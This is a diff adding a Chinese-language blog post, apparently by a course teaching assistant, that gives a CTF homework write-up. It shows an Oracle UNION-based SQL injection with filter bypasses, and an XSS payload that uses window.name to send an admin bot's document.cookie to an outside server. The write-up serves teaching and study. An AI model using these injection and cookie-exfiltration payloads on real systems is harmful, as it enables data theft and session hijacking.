@@ -1,0 +1,76 @@
+---
+title: "程式安全::HW4 Write-up"
+description: ""
+publishDate: "2019-12-18"
+category: "CTF"
+layout: "../../layouts/ArticleLayout.astro"
+---
+
+
+2019 年交大程式安全 HW4 write-up
+哈哈是我拉😎😎😎助教拉🤙🤙🤙
+
+# Cathubv2
+
+本題的漏洞在影片的頁面（點進去任意一支影片的地方），url 裡的 vid 會被背後的 OracleDB 抓去搜尋，我們可以猜想到影片連結與標題應該是從DB撈出來的，所以我們可能可以透過 UNION 的方式來直接把資訊印出來，這裡可以先測試有幾個 column :
+
+```sql
+vid=-1 union select 1,null from dual
+```
+
+要注意的是空白會被阻擋，所以我們要把空白置換成 `/**/` 或是 `%0a` 來繞過檢查，同時也可以發現 `'` 跟 `chr` 也會被擋下來，最後我們可以知道總共有三個欄位：
+
+```sql
+vid=-1 union select 1,null,null from dual
+```
+
+通過測試可以知道，第二個欄位是影片標題，這裡我們可以去撈 oracleDB 的 metadata 來找有趣的 table 名：
+
+```sql
+vid=-1 union select null,table_name,null from user_tables offset 1 rows fetch first 1 rows only
+
+vid=-1 union select null,table_name,null from user_tables offset 2 rows fetch first 1 rows only
+
+vid=-1 union select null,table_name,null from user_tables offset 3 rows fetch first 1 rows only
+
+...
+```
+
+會發現撈出名為 `S3CRET` 的 table，這時我們可以嘗試去看他有什麼 column，前面提到 `'` 被擋住所以無法直接使用 `where table_name='S3CRET'`，簡單使用 `()` 做另外一次 query 就可以正常使用 where 了：
+
+```sql
+vid=-1 union select null,column_name,null from user_tab_columns where
+    table_name=(select table_name from user_all_tables offset 5 rows fetch first 1 rows only)
+offset 1 rows fetch first 1 rows only
+```
+
+可以找到有一個 column 叫做 `V3RY_S3CRET_C0LUMN`，所以現在只要把該 column 的值都撈出來就好了：
+
+```sql
+select V3RY_S3CRET_COLUMN from S3CRET offset 1 rows fetch first 1 rows only
+
+...
+```
+
+然後就可以拿到 flag 了。
+
+# how2xss
+
+繞過方式同這個 [writeup](https://medium.com/@renwa/security-fest-2019-ctf-entropian-web-write-up-f81fb11f675b)，這裡較特別的就是 `window.name`，在一個 window 裡面載入的 document 事實上是共用一個 window.name，每個載入的 document 都可以去讀寫他，所以如果題目沒對 `window.name` 做過修改的話，他會使用上一個頁面的 `window.name` ，這樣我們可以不用用 iframe 去多做一個 window ，所以我們可以在我們的 server 上放 payload ，讓 admin 直接造訪 payload 所在的網址，而不一定要 iframe:
+
+```javascript terrynini.tw
+<script>
+window.name="document.location='https://terrynini.tw/'+document.cookie";
+window.location="https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E";
+</script>
+```
+
+然後直接回報 `terrynini.tw` 給 admin，這樣 `window.location` 跳轉之後，其實我們 `window.name` 還是會被保存，如此透過本來頁面的 xss 漏洞來觸發 `svg/onload` 裡的 `eval` 去造訪我們的 server，如此可以在自己 server 上的 apache access log 看到 admin bot 造訪了什麼 uri，也就是 `document.cookie`。
+
+## 12/25 補充
+
+看了大家繳交的 writeup 其實不太確定大家是不是有理解原理....，因為這題較混亂，所以這次作業評分有解釋清楚的人會多一個 `+` 號，分數之後再討論，總括來說會有兩種 payload ，一種是像上述 writeup 一樣使用 `<iframe src=/\PSHTA.ML>` 讓 admin 訪問，第二種是直接把 javascript 所在的網址給 admin 去訪問。主要差別在於，如果回報給 admin 的網址必須也得是 `https://edu-ctf.kaibro.tw:30678/hackme.php?q=` 的話，那我們就必須使用 `iframe` 的方式不可，但這題其實沒有這個限制，所以不需要多繞一個 `iframe` 來完成，可以直接傳網址就好了。
+
+因為不知道大家是不是有發現可以回報外部網域，writeup 的語意可能有誤會，所以這裡不用 `A/B` 來評分，就讓有解釋清楚的人多點分數這樣子。
+
+在其他部分，這兩種 payload 其實沒有差別， `iframe` 跟直接存取網址一樣，都有跨域拿 cookie 的問題，所以我們不能在 `iframe` 裡面直接拿 cookie，必須把 admin 導回同網域 (`edu-ctf.kaibro.tw`) 中有 Reflected XSS 漏洞的頁面，這裡利用 `window.name` 跨域的特性所以可以夾帶我們真實的 payload 來繞過 filter。
